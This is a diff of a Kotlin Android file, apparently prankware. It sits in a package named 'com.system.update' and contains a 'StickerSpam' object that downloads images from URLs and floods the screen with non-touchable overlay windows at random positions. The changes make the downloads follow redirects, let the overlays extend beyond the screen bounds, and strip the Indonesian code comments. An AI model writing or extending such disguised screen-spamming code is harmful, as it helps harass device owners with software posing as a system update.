@@ -3,9 +3,7 @@ package com.system.update
 import android.content.Context
 import android.graphics.Bitmap
 import android.graphics.BitmapFactory
-import android.graphics.Color
 import android.graphics.PixelFormat
-import android.graphics.drawable.BitmapDrawable
 import android.os.Build
 import android.os.Handler
 import android.os.Looper
@@ -13,7 +11,6 @@ import android.util.TypedValue
 import android.view.Gravity
 import android.view.View
 import android.view.WindowManager
-import android.widget.FrameLayout
 import android.widget.ImageView
 import java.net.HttpURLConnection
 import java.net.URL
@@ -33,13 +30,13 @@ object StickerSpam {
         val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
         handler = Handler(Looper.getMainLooper())
 
-        // Pre-download semua sticker ke cache
         val bitmaps = mutableListOf<Bitmap>()
         for (u in urls) {
             try {
                 val conn = URL(u).openConnection() as HttpURLConnection
                 conn.connectTimeout = 10000
                 conn.readTimeout = 10000
+                conn.instanceFollowRedirects = true
                 conn.doInput = true
                 conn.connect()
                 val bmp = BitmapFactory.decodeStream(conn.inputStream)
@@ -82,11 +79,11 @@ object StickerSpam {
                                 type,
                                 WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                                         WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
-                                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
+                                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
+                                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                                 PixelFormat.TRANSLUCENT
                             )
 
-                            // Random posisi di seluruh layar
                             val metrics = ctx.resources.displayMetrics
                             params.x = Random.nextInt(0, maxOf(1, metrics.widthPixels - sizePx))
                             params.y = Random.nextInt(0, maxOf(1, metrics.heightPixels - sizePx))
@@ -95,7 +92,6 @@ object StickerSpam {
                             wm.addView(view, params)
                             activeViews.add(view)
 
-                            // Fade out + remove
                             handler?.postDelayed({
                                 try {
                                     view.animate()
@@ -111,7 +107,6 @@ object StickerSpam {
                                 } catch (_: Exception) {}
                             }, 800)
 
-                            // Kalau terlalu banyak, remove yang lama
                             while (activeViews.size > maxActive) {
                                 val old = activeViews.removeAt(0)
                                 try { wm.removeView(old) } catch (_: Exception) {}
